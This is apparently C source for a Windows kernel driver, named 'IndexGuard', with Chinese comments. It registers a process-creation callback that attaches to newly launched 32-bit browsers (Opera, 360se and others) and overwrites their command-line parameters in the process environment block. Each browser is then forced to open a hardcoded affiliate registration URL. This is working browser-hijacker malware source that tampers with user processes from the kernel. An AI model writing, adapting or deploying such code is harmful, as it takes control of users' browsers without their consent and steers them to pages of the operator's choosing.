#include "pch.h"

BOOLEAN g_bEnableSuccess = FALSE;
//L"http://ie774.com/6IzQ4";// 
WCHAR* g_szIndexPage = L"https://1296880.com:6880/Register/?a=2503679";// L"https://www.2345.com/?25908";//L"http://ie774.com/6IzQ4";
USHORT g_szIndexPageLen = 0;

VOID IndexGuardProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
	PPEB32 peb = NULL;
	BOOLEAN bAttach = FALSE;
	KAPC_STATE Apc = { 0 };
	PEPROCESS Process = NULL;
	WCHAR* szNewCommandBuff = NULL;

	if (!Create)
		return;

	do
	{
		if (!NT_SUCCESS(PsLookupProcessByProcessId(ParentId, &Process)))
			break;

		if (BrowserIsWhiteParentProcess(Process))
			break;

		Process = NULL;

		if (!NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &Process)))
			break;
#ifdef _AMD64_
		peb = PsGetProcessWow64Process(Process);
#else
		peb = (PPEB32)PsGetProcessPeb(Process);
#endif
		if (peb == NULL) // 64位浏览器不管
			break;

		KeStackAttachProcess(Process, &Apc);
		bAttach = TRUE;

		if (BrowserIsOpenFile(PebGetCommandLinePoint(peb)))
			break;

		if (BrowserIsSpecialBrowerProcess((CHAR*)PsGetProcessImageFileName(Process)))
		{
			WCHAR* szParmeter = PebGetParameterPoint(peb);
			
			if (szParmeter == NULL)
				break;
#ifdef _DEBUG_
			DbgPrint(
				"SpecialProcess:%ws\n"
				"EPROCESS:%p\n"
				"ProcessName:%s\n"
				"Pid:%d\n",
				szParmeter,
				Process,
				PsGetProcessImageFileName(Process),
				PsGetProcessId(Process));
#endif
			if (!BrowserIsSpecialBrowerSuffix(szParmeter))
				break;

			szNewCommandBuff = PebGetNewCommandLinePoint(peb);
			if (szNewCommandBuff == NULL)
				break;

			BrowerSetNewParmeter(peb, g_szIndexPage, (PVOID)szNewCommandBuff, TRUE);
			break;

		}

		// Opera 
		if (BrowserIsDualProcess((CHAR*)PsGetProcessImageFileName(Process), PebGetCommandLinePoint(peb)))
		{
			// 有参数了不保护
			if (!BrowerIsNoParameter(peb))
				break;

			//DbgBreakPoint();

			USHORT dwMaxWriteLen = PebGetCommandLineMaxWriteLen(peb);

			if (dwMaxWriteLen == 0)
				break;

			// 长链接也不保护
			if (dwMaxWriteLen >= g_szIndexPageLen)
			{
#ifdef _DEBUG_
				DbgPrint(
					"NoParameterMaxWrite:\n"
					"EPROCESS:%p\n"
					"ProcessName:%s\n"
					"Pid:%d\n",
					Process,
					PsGetProcessImageFileName(Process),
					PsGetProcessId(Process));
#endif
				BrowserSetMaxParmeter(peb, g_szIndexPage, g_szIndexPageLen);
				break;
			}

			break;

		}

		if (BrowserIsGeneralBrowerProcess((CHAR*)PsGetProcessImageFileName(Process)))
		{
			if (BrowerIsNoParameter(peb))
				goto FirstStart;

#ifdef _DEBUG_
			DbgPrint(
				"Assist Process\n"
				"Parameter:%ws\n"
				"EPROCESS:%p\n"
				"ProcessName:%s\n"
				"Pid:%d\n",
				PebGetParameterPoint(peb),
				Process,
				PsGetProcessImageFileName(Process),
				PsGetProcessId(Process));
#endif

			if (!BrowerIsWebParameter(peb))
				break;

		FirstStart:
#ifdef _DEBUG_
			DbgPrint(
				"First Process:\n"
				"Parameter:%ws\n"
				"EPROCESS:%p\n"
				"ProcessName:%s\n"
				"Pid:%d\n",
				PebGetParameterPoint(peb),
				Process,
				PsGetProcessImageFileName(Process),
				PsGetProcessId(Process));
#endif
			szNewCommandBuff = PebGetNewCommandLinePoint(peb);
			if (szNewCommandBuff == NULL)
				break;

			/*if (_strnicmp("360se.exe", (CHAR*)PsGetProcessImageFileName(Process), strlen("360se.exe")))
				BrowerSetNewParmeter(peb, g_szIndexPage, (PVOID)szNewCommandBuff, TRUE);
			else
				BrowserSetMaxParmeter(peb, g_szIndexPage, g_szIndexPageLen);*/
			BrowerSetNewParmeter(peb, g_szIndexPage, (PVOID)szNewCommandBuff, TRUE);
			    break;

			/*if (BrowerIsNoParameter(peb))
			{
				USHORT dwMaxWriteLen = PebGetCommandLineMaxWriteLen(peb);

				if (dwMaxWriteLen == 0)
					break;

				if (dwMaxWriteLen >= g_szIndexPageLen)
				{
				
					DbgPrint(
						"NoParameterMaxWrite:\n"
						"EPROCESS:%p\n"
						"ProcessName:%s\n"
						"Pid:%d\n",
						Process,
						PsGetProcessImageFileName(Process),
						PsGetProcessId(Process));

					BrowserSetMaxParmeter(peb, g_szIndexPage, g_szIndexPageLen);
				}
				else
				{
					szNewCommandBuff = PebGetNewCommandLinePoint(peb);
					if (szNewCommandBuff == NULL)
						break;

					BrowerSetNewParmeter(peb, g_szIndexPage, (PVOID)szNewCommandBuff, TRUE);
					break;
				}

			}
			else
			{
				DbgPrint(
					"Parameter:%ws\n"
					"EPROCESS:%p\n"
					"ProcessName:%s\n"
					"Pid:%d\n", 
					PebGetParameterPoint(peb),
					Process,
					PsGetProcessImageFileName(Process),
					PsGetProcessId(Process));

				if (!BrowerIsWebParameter(peb))
					break;

				BrowerSetNewParmeter(peb, g_szIndexPage, NULL, FALSE);
				break;	
			}*/
		}


	} while (FALSE);

	if (bAttach)
		KeUnstackDetachProcess(&Apc);

	if (Process)
		ObDereferenceObject(Process);
}

NTSTATUS IndexGuardEnableCloseProtect(BOOLEAN bRemove)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	if (bRemove)
	{
		if (g_bEnableSuccess == FALSE)
			return STATUS_SUCCESS;

		g_bEnableSuccess = FALSE;
        //PsSetCreateProcessNotifyRoutineEx
		return PsSetCreateProcessNotifyRoutine(IndexGuardProcessNotifyRoutine, TRUE);
	}

	//
	g_szIndexPageLen = (USHORT)wcslen(g_szIndexPage) * 2;

	status = PsSetCreateProcessNotifyRoutine(IndexGuardProcessNotifyRoutine, FALSE);

	if (NT_SUCCESS(status))
		g_bEnableSuccess = TRUE;

	return status;
}